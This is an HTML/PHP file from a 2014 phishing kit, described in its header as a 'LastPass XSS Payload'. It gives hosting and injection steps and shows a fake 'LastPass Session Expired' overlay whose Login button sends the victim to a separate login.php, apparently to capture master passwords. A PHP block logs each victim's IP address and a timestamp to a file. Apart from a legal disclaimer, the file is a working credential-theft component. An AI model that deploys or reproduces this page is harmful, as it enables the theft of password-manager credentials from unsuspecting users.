<!--

LastPass XSS Payload
greg . foss [at] owasp . org
4/24/2014
v 0.1 Beta

The code below can be used to exploit XSS vulnerabilities and steal LastPass credentials.

# ONLY USE THIS PAYLOAD LEGALLY, AGAINST AUTHORIZED TARGETS
# THE DEVELOPER OF THIS PAYLOAD IS NOT LIABLE FOR ILLEGAL/QUESTIONABLE ACTIVITIES CONDUCTED WITH THIS TOOL
# BY USING THIS TOOL, YOU AGREE THAT YOU HAVE READ AND UNDERSTAND THESE TERMS

How To:
	Host this page along with 'login.php' and the 'attrib' folder on a server that you own, then modify the 'xss.html' payload with the full path to this file and assure that you retain the '?&amp;error=1' parameters.

	Inject the payload 'xss.html' into a vulnerable site.

-->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="CACHE-CONTROL" content="NO-CACHE"><script type="text/Javascript" src="attrib/lpfulllib.js"></script><script type="text/Javascript" src="attrib/notification.js"></script><script src="attrib/overlay1.js"></script><style type="text/css"> #lastpass-notification { height: 13px;padding: 7px 10px !important;text-align: left;position: relative;font-weight:bold;font-family:Helvetica Neue,Helvetica,Arial,Sans-serif;font-size: 11px;z-index: 1000000099;color: black;vertical-align: top; float: none;} #lastpass-content {display: inline;  padding-left: 5px;vertical-align: top;text-align: left; float: none; width: 100%;-webkit-user-select:none; font-family: Helvetica Neue,Helvetica,Arial,sans-serif;font-size: 11px;} .lppopup {position: absolute;-webkit-border-radius: 0px 0px 5px 5px;border-radius: 0px 0px 5px 5px;-webkit-box-shadow: 2px 3px 10px 2px #a6a6a6;box-shadow: 2px 3px 10px 2px #a6a6a6;z-index: 99999;background: #fff;overflow: auto;x: 0px;y: 0px;width: 300px;height: 200px;display: none;} .lppopup table {float:none; display:table; margin: 0px; padding: 0px; border-spacing: 1px;} .lppopup tr:hover {background: -webkit-linear-gradient(top, rgba(214,249,255,1) 0%,rgba(158,232,250,1) 100%);background: -o-linear-gradient(top, rgba(214,249,255,1) 0%,rgba(158,232,250,1) 100%);} .lppopup tr {-webkit-user-select:none;background-color: #fff; height: 22px;} .lppopup td {-webkit-user-select:none;font-size: 11px;font-family: Helvetica Neue,Helvetica,Arial,sans-serif;color: black;cursor: pointer;} .lppopupextended {position: absolute;-webkit-border-radius: 0px 0px 5px 5px;border-radius: 0px 0px 5px 5px;-webkit-box-shadow: 2px 3px 10px 2px #a6a6a6;box-shadow: 2px 3px 10px 2px #a6a6a6;z-index: 99999;background: #fff;x: 0px;y: 0px;width: 410px;height: 200px;display: none; overflow-x:hidden;} .lppopupextended table {float:none; display:table; margin: 0px; padding: 0px; border-spacing: 1px; overflow-x:hidden;} .lppopupextended tr {-webkit-user-select:none;background-color: #fff; height: 22px; overflow-x:hidden;} .lppopupextended td {-webkit-user-select:none;font-size: 11px;font-family: Helvetica Neue,Helvetica,Arial,sans-serif;color: black;cursor: pointer; white-space:normal; overflow-x:hidden; } .lppopupextended th {-webkit-user-select:none;font-size: 11px;font-family: Helvetica Neue,Helvetica,Arial,sans-serif;color: black;background-color: #ececec;cursor: pointer; height: 16px;} .sortable tr:hover {background: -webkit-linear-gradient(top, rgba(214,249,255,1) 0%,rgba(158,232,250,1) 100%);background: -o-linear-gradient(top, rgba(214,249,255,1) 0%,rgba(158,232,250,1) 100%);} .lpopupsearchbox {-webkit-user-select:none;background-color: #fff; height: 22px;} .lpopupsearchbox:hover {-webkit-user-select:none;background-color: #fff; height: 22px;} .lpbutton,#lastpass-notification button[type="button"] {background-color: #eeeeee;background-image: -webkit-gradient(linear, left top, left bottom, from(#eeeeee), to(#cccccc));background-image: -webkit-linear-gradient(top, #eeeeee, #cccccc);background-image: -o-linear-gradient(top, #eeeeee, #cccccc);background-image: linear-gradient(top, #eeeeee, #cccccc);border: 1px solid #ccc;border-bottom: 1px solid #bbb;-webkit-border-radius: 3px;border-radius: 3px;color: #333;line-height: 1;font-weight:bold;text-align: center;text-shadow: 0 1px 0 #eee;width: auto;float: right; margin: -2px 5px 2px 2px; height:17px;padding:1px 6px !important;} .lpbutton:hover,#lastpass-notification button[type="button"]:hover {background-color: #dddddd; background-image: -webkit-gradient(linear, left top, left bottom, from(#dddddd), to(#bbbbbb)); background-image: -webkit-linear-gradient(top, #dddddd, #bbbbbb);-o-linear-gradient(top, #dddddd, #bbbbbb); border: 1px solid #bbb; border-bottom: 1px solid #999; cursor: pointer; text-shadow: 0 1px 0 #ddd;} #lastpass-notification img {margin: 0px 0px 0px 0px;padding: 0px 0px 3px 0px;} </style><script src="attrib/menuscript.js"></script><script src="attrib/sorttable.js"></script><link rel="stylesheet" type="text/css" href="attrib/overlay.css"></head><body style="overflow: hidden; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAIAAAJYCAYAAABIPDecAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAINJREFUWMPtz0EKAjEMheEIBW/h+byKF/QSLtSKzCBOok58HWTo3sWf1cdLSpNy3O7c3lXGCJtxsylxdU9UJQ/LKpPFZobHkiRcM75OwlYz7bn3Wg0R0W31kwbTPoeo+2+Sh30wCnfhIpyEs1CFQXj+bmjLpwAAAAAAAAAAAAAAgH/DC5OFQV7fXlzwAAAAAElFTkSuQmCC); background-position: initial initial; background-repeat: repeat no-repeat;"><img width="16" height="16" style="width:16px;height:16px;display:inline;" src="data:image/gif;base64,R0lGODdhEAAQAPQfAHEAGq9RZp8BJfT09JkCJKUuSO/q6/n//vHh5YYBGvf6+tOyucB0hsuLmpUiOpIAHIgJJtzFy7pneuvT2fP49/Dw8L5/juS+x8Scpn4BHaMDJ3cAHHQAG6YDKP///3gAFiH/C1hNUCBEYXRhWE1QRj94cDI2NkQzRERDQjk3IiB4bXBNTTpJbnN0YW5jZUlEPVJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz4ALAAAAAAQABAAAAWYYCeOZNlpKCoIKptq60p0xVo4RCwQORFMCM3jggjIeLxHwONhFJiMBzL5SDQ8iIln8ehSHYGAZHA4KBrhQre6LA/eZKYlUU0EFBVDBa5XMBKACRAOYBUUhxKEEIAZjRkfCwcRkREQH46OHwEHFAEOFQcWl40bpRwOGAsAH6kFH6WwpQAcEAAbGRy2sBy8vbO5vb4Aw8TFxiEAOw=="><div id="lastpass-content" style="color:white;-webkit-user-select:none;">LastPass Session Expired.</div><img width="16" height="16" lptype="close" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABYklEQVR42qXTvWrCUBQHcKe+QqfundPFxT0OnTJ0MtChmw/g4NgH6FtkEwoBv8BEA8EYFGswBIIEhFCrU4V26cfp+Qe5RLlKwcAPknty/7mHe1NoNBoy9+yZJWzBcN3J3j0cuGJJt9ul0WhEYRjSfD4nz/Oo0+kQ10J2eSygyL4xcb1eyyAUIV/sWhawHY/HtFqtTvJ9HyGbw4B6r9ejNE3/ZdfOQz4gnkwmtFwuM7VajRRFIcMwyLIs3GNM1HetePmA9yAIKEkSoVqtUrlcBtzv1abTKQJe9wIwGMexgGd8GQ5rvFoEvOUDFtiqKIoEXddJVdWMpml7Ndd1EfCSD3jC3mPPoVKpUKlUItM0AavAmKi3220E1PMBF+zTcRyazWYn9ft9Qsuyc3DLfm3bRs8y2BFM/mFFWQDcsE2r1SKsZjgcZgaDATWbTUxOxSmUBwiPLGEfOzGrH/uZzlIgorP8ASYfyJK1fcokAAAAAElFTkSuQmCC" id="lphideoverlay" style="width:16px;height:16px;float: right; margin-right: 10px; margin-bottom: -10px;"> <button type="button" lptype="tryagainbtn" id="lptryagainbtn" class="lpbutton" value="Login" onClick="parent.location='login.php'">Login</button>
<?php
function getRealIpAddr()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$ip = getRealIpAddr();
$date = date ("d/m/Y:H:i:s");
$page = "LastPass-XSS-Hit";
$message = "$date _ $ip _ $page\n"; 
$File = "xss.log";
$Open = fopen($File, "a+"); 
if ($Open){ 
    fwrite($Open, "$message"); 
    fclose ($Open); 
}
?>
</body></html>